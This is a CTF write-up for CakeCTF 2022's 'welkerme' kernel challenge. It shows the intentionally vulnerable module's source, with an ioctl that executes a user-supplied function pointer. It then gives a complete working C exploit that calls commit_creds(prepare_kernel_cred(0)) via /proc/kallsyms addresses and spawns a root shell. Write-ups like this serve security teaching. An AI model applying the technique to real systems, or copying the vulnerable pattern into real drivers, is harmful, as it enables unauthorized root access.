---
title: Welkerme
readtime: true
date: 2022-09-05
tags: [kernel,pwn]
---
### Attachments : [welkerme.tar.gz](https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/welkerme/welkerme_afcc40e7baa18649730945cde6475354.tar.gz) , [compress.sh](https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/welkerme/compress.sh)
<br>

First of all, let's have a look on the source code of the driver.
```c
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("welkerme - CakeCTF 2022");

#define DEVICE_NAME "welkerme"
#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

static int module_open(struct inode *inode, struct file *filp) {
  printk("'module_open' called\n");
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  printk("'module_close' called\n");
  return 0;
}

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  long (*code)(void);
  printk("'module_ioctl' called with cmd=0x%08x\n", cmd);

  switch (cmd) {
    case CMD_ECHO:
      printk("CMD_ECHO: arg=0x%016lx\n", arg);
      return arg;

    case CMD_EXEC:
      printk("CMD_EXEC: arg=0x%016lx\n", arg);
      code = (long (*)(void))(arg);
      return code();

    default:
      return -EINVAL;
  }
}

static struct file_operations module_fops = {
  .owner   = THIS_MODULE,
  .open    = module_open,
  .release = module_close,
  .unlocked_ioctl = module_ioctl
};

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME))
    return -EBUSY;

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);
```

This is the source code of a kernel module. Inserting or loading the module into the kernel creates a device (file) at `/dev/welkerme`. We can interact with the driver using `ioctl`. Calling `ioctl` with the command `CMD_EXEC` i.e `0xc0de0002` would call an arbitrary function pointer supplied by the user as `ioctl` arg. 

```c
case CMD_EXEC:
      printk("CMD_EXEC: arg=0x%016lx\n", arg);
      code = (long (*)(void))(arg);
      return code();
```


Before actually doing something, let's have a look on some core concepts related to privilege escalation.

### task_struct
This is the Process Control Block and stores all the information needed by a process. Every task has a `task_struct` object living in memory. 

```c
struct task_struct {
    volatile long state;            // process state (running, stopped, ...)
    void *stack;                    // task's stack pointer
    int prio;                       // process priority
    struct mm_struct *mm;           // memory address space
    struct files_struct *files;     // open file information
    const struct cred *cred;        // credentials
  // ...
};

struct cred {
    // .
    // .
    // .
    kuid_t  uid;        /* real UID of the task */
    kgid_t  gid;        /* real GID of the task */
    kuid_t  suid;       /* saved UID of the task */
    kgid_t  sgid;       /* saved GID of the task */
    kuid_t  euid;       /* effective UID of the task */
    kgid_t  egid;       /* effective GID of the task */
    // .
    // .
    // .
};
```
The `cred` struct stores information about the owner, capabilities,etc. of a process. Privilege escalation is achieved via changing `current_task->cred->euid` to 0. (Might need to change some other id's depending on situation). The following code will do this for us!
```c
commit_creds(prepare_kernel_cred(0));
```
`prepare_kernel_cred` prepares a set of credentials for a kernel service which is committed by passing its return value as an argument to the function `commit_creds`.

Cool, not let's find out the address of `prepare_kernel_cred` and `commit_creds`. To do this, we need to read `/proc/kallsyms` by booting into the kernel as root. Run `debug.sh`, provided by the author. 
```sh
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810726e0 T prepare_kernel_cred

/ # cat /proc/kallsyms | grep commit_creds
ffffffff81072540 T commit_creds
```
Let's write a helper function for calling `commit_creds(prepare_kernel_cred(0))`
```c
void getRoot(){
    void* (*prepare_kernel_cred)(int) = 0xffffffff810726e0;
    void (*commit_creds)(void*) = 0xffffffff81072540;
    commit_creds(prepare_kernel_cred(0));
}
```
After that, we only need to call `ioctl` and supply a pointer to the function `getRoot`

```
ioctl(fd, CMD_EXEC, &getRoot);
system("/bin/sh");
```
Complete exploit:
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

void getRoot(){
   void* (*prepare_kernel_cred)(int) = (void*)0xffffffff810726e0;
    void (*commit_creds)(void*) = (void*)0xffffffff81072540;
    commit_creds(prepare_kernel_cred(0));
}

int main(void) {
  int fd = open("/dev/welkerme",O_RDWR);
  if(fd==-1){
    perror("open");
    exit(1);
  }

  ioctl(fd, CMD_EXEC, &getRoot);
  system("/bin/sh");
  close(fd);
  return 0;
}

```
Compile, deliver and run this exploit to escalate privileges to the root!
<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/images/welkerme_1.png"/>

### References
<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a>
